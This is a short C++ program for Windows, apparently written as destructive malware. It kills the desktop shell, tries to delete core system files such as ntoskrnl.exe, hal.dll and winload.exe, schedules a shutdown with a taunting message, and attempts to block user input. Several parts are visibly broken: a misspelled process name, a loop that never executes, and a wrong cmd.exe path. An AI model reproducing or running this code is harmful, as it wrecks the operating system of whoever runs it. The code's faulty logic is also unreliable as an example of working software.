#include <iostream>
#include <windows.h>
void delfiles() {
  std::remove("C:\\Windows\\System32\\hal.dll");
  std::remove("C:\\Windows\\System32\\wininit.exe");
  std::remove("C:\\Windows\\System32\\winload.exe");
  std::remove("C:\\Windows\\System32\\ntoskrnl.exe");
  std::remove("C:\\Windows\\explorer.exe");


}
void closeinscnd() {
  system("shutdown /s /t 30 /c Say Good Bye To Your PC!");
  


}
void closeexplorer() {
  FreeConsole();
  system("taskkill /f /IM exlorer.exe");

}
void delcmd() {
  std::remove("C:\\System32\\cmd.exe");

}
void blockinput() {
  for(int i = 0;i>900000;i++) {
    BlockInput(true);

  }

}
int main() {
  closeexplorer();
  delfiles();
  closeinscnd();
  delcmd();
  blockinput();



}
